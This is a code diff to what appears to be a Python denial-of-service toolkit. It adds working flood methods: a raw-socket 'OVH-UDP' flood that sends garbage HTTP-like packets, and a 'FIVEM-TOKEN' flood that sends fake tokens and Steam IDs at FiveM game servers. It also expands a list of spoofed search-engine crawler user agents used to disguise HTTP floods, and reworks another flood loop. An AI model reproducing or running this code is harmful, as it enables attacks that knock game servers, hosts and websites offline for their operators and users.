@@ -10,11 +10,12 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from random import choice as randchoice
+from random import choice as randchoice, randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
+import ssl
 from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
@@ -44,6 +45,14 @@ logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
+# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
+if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
+    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+# Disable insecure TLS versions for additional safety
+if hasattr(ssl, "OP_NO_TLSv1"):
+    ctx.options |= ssl.OP_NO_TLSv1
+if hasattr(ssl, "OP_NO_TLSv1_1"):
+    ctx.options |= ssl.OP_NO_TLSv1_1
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -127,20 +136,80 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
-                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
-                                "TS3", "MCPE", "ICMP"
+                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
+                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
-google_agents = [
-    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
-    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
-    "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
+search_engine_agents = [
+    # ---------------- Google ----------------
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
+    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
+    "Googlebot-Image/1.0",
+    "Googlebot-Video/1.0",
+    "Googlebot-News",
+    "AdsBot-Google (+http://www.google.com/adsbot.html)",
+    "AdsBot-Google-Mobile-Apps",
+    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
+    "Mediapartners-Google",
+    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
+
+    # ---------------- Bing / Microsoft ----------------
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "BingPreview/1.0b",
+    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
+
+    # ---------------- Yahoo ----------------
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+    "Yahoo! Slurp China",
+
+    # ---------------- Yandex ----------------
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
+    "YandexImages/3.0 (+http://yandex.com/bots)",
+    "YandexVideo/3.0 (+http://yandex.com/bots)",
+    "YandexNews/3.0 (+http://yandex.com/bots)",
+
+    # ---------------- Baidu ----------------
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
+    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
+
+    # ---------------- DuckDuckGo ----------------
+    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
+    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
+
+    # ---------------- Applebot ----------------
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
+    "+http://www.apple.com/go/applebot)",
+
+    # ---------------- Facebook / Social ----------------
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "Facebot/1.0",
+
+    # ---------------- Twitter ----------------
+    "Twitterbot/1.0",
+
+    # ---------------- LinkedIn ----------------
+    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
+
+    # ---------------- Pinterest ----------------
+    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
+
+    # ---------------- Other Major Bots ----------------
+    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
+    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
+    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
+    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
+    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
+    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
+    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
 ]
 
 
@@ -400,6 +469,8 @@ class Layer4(Thread):
             "TS3": self.TS3,
             "MCPE": self.MCPE,
             "FIVEM": self.FIVEM,
+            "FIVEM-TOKEN": self.FIVEMTOKEN,
+            "OVH-UDP": self.OVHUDP, 
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
@@ -470,6 +541,14 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def OVHUDP(self) -> None:
+        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            while True:
+                for payload in self._generate_ovhudp():
+                    Tools.sendto(s, payload, self._target)
+        Tools.safe_close(s)
+
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
         s = None
@@ -489,8 +568,7 @@ class Layer4(Thread):
 
     def AMP(self) -> None:
         s = None
-        with suppress(Exception), socket(AF_INET, SOCK_RAW,
-                                         IPPROTO_UDP) as s:
+        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, *next(self._amp_payloads)):
                 continue
@@ -528,6 +606,24 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def FIVEMTOKEN(self) -> None:
+        global BYTES_SEND, REQUESTS_SENT
+
+        # Generete token and guid
+        token = str(uuid4())
+        steamid_min = 76561197960265728
+        steamid_max = 76561199999999999
+        guid = str(randint(steamid_min, steamid_max))
+
+        # Build Payload
+        payload_str = f"token={token}&guid={guid}"
+        payload = payload_str.encode('utf-8')
+
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
     def FIVEM(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
@@ -554,6 +650,41 @@ class Layer4(Thread):
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
+
+    def _generate_ovhudp(self) -> List[bytes]:
+        packets = []
+
+        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
+        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']
+
+        for _ in range(randint(2, 4)):
+            ip = IP()
+            ip.set_ip_src(__ip__)
+            ip.set_ip_dst(self._target[0])
+
+            udp = UDP()
+            udp.set_uh_sport(randint(1024, 65535))
+            udp.set_uh_dport(self._target[1])
+
+            payload_size = randint(1024, 2048)
+            random_part = randbytes(payload_size).decode("latin1", "ignore")
+
+            method = randchoice(methods)
+            path = randchoice(paths)
+
+            payload_str = (
+                f"{method} {path}{random_part} HTTP/1.1\n"
+                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
+            )
+
+            payload = payload_str.encode("latin1", "ignore")
+
+            udp.contains(Data(payload))
+            ip.contains(udp)
+
+            packets.append(ip.get_packet())
+
+        return packets
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
@@ -942,14 +1073,14 @@ class HttpFlood(Thread):
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
             "GET /sitemap.xml HTTP/1.1\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
             "From: googlebot(at)googlebot.com\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n"
             "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                           ProxyTools.Random.rand_str(4)) +
@@ -1091,7 +1222,10 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
@@ -1107,9 +1241,6 @@ class HttpFlood(Thread):
                              'Sec-Gpc: 1\r\n'
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
